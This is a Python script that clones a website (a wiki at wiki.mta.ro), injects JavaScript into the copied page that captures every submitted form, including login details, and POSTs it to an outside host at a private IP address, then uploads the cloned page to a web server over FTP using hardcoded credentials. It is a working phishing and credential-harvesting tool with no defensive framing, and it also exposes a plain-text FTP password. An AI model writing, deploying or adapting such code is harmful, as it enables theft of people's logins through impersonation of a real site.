import ftplib
import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse


# FTP credentials
ftp_host = "ftp.kx8.ad1.mytemp.website"  # Replace with your FTP host
ftp_user = "admin@kx8.ad1.mytemp.website"  # Replace with your FTP username
ftp_pass = "I.,hwqStkTa,"  # Replace with your FTP password
ftp_port = 21  # Default FTP port

remote_directory = "./"   

def get_name_from_url(url):
    parsed_url = urlparse(url)
    domain_name = parsed_url.netloc.replace("www.", "")
    return domain_name


def sanitize_filename(filename, default_extension="css"):
    # Remove or replace characters that are not allowed in file names
    sanitized = "".join(c for c in filename if c.isalnum() or c in (' ', '.', '_')).rstrip()
    # If the file does not have an extension or has an unusual one, add the default extension
    if not sanitized or '.' not in sanitized or sanitized.split('.')[-1] not in ['css']:
        sanitized += f".{default_extension}"
    return sanitized

def clone_website(url, output_directory):
    try:
        # Send a GET request to the URL
        response = requests.get(url)
        response.raise_for_status()  # Check for request errors

        # Parse the HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Create the output directory if it doesn't exist
        if not os.path.exists(output_directory):
            os.makedirs(output_directory)

        # Inject JavaScript to capture login data
        script = '''
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                var forms = document.getElementsByTagName('form');
                for (var i = 0; i < forms.length; i++) {
                    forms[i].addEventListener('submit', function(event) {
                        var formData = new FormData(this);
                        var data = {};
                        formData.forEach((value, key) => {
                            data[key] = value;
                        });

                        // Send the data to your server
                        fetch('http://10.204.7.168:5000/capture', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        });
                    });
                }
            });
        </script>
        '''

        # Append the script to the HTML body
        soup.body.append(BeautifulSoup(script, 'html.parser'))

        # Save the main HTML file
        with open(os.path.join(output_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        print(f"HTML content saved successfully in '{output_directory}/index.html'.")

        # Download and save all CSS files
        css_links = soup.find_all('link', {'rel': 'stylesheet'})
        for link in css_links:
            css_url = urljoin(url, link['href'])
            css_response = requests.get(css_url)
            css_response.raise_for_status()  # Check for request errors

            parsed_url = urlparse(link['href'])
            css_filename = sanitize_filename(os.path.basename(parsed_url.path))
            css_path = os.path.join(output_directory, css_filename)
            
            with open(css_path, 'w', encoding='utf-8') as css_file:
                css_file.write(css_response.text)

            link['href'] = css_filename

        print("CSS files saved and linked successfully.")

        # Download and save all images
        image_tags = soup.find_all('img')
        for img in image_tags:
            img_url = urljoin(url, img['src'])
            img_response = requests.get(img_url)
            img_response.raise_for_status()  # Check for request errors

            img_filename = sanitize_filename(os.path.basename(urlparse(img['src']).path), "jpg")
            img_path = os.path.join(output_directory, img_filename)
            with open(img_path, 'wb') as img_file:
                img_file.write(img_response.content)

            img['src'] = img_filename

        print("Images saved and linked successfully.")

        # Save the updated HTML with local references
        with open(os.path.join(output_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        print(f"Website cloned successfully in '{output_directory}'.")

    except Exception as e:
        print(f"An error occurred: {e}")





url_to_clone = "https://wiki.mta.ro"



local_directory = get_name_from_url(url_to_clone)
clone_website(url_to_clone, local_directory)

# FTP upload part
def upload_file(ftp, local_file_path, remote_file_path):
    with open(local_file_path, "rb") as file:
        ftp.storbinary(f"STOR {remote_file_path}", file)
        print(f"Uploaded: {local_file_path} to {remote_file_path}")
        

# Connect to the FTP server and upload files
ftp = ftplib.FTP()
ftp.connect(ftp_host, ftp_port)
ftp.login(ftp_user, ftp_pass)
ftp.cwd(remote_directory)






for root, dirs, files in os.walk(local_directory):
    for file in files:
        local_file_path = os.path.join(root, file)
        relative_path = os.path.relpath(local_file_path, local_directory)
        remote_file_path = os.path.join(remote_directory, relative_path).replace("\\", "/")

        # Create directories on the server if they don't exist
        remote_dirs = os.path.dirname(remote_file_path).split("/")
        current_dir = remote_directory
        for directory in remote_dirs:
            if directory not in ftp.nlst():
                ftp.mkd(directory)
            ftp.cwd(directory)
        ftp.cwd(remote_directory)

        # Upload the file
        upload_file(ftp, local_file_path, remote_file_path)


# Close the FTP connection
ftp.quit()
print("All files uploaded successfully.")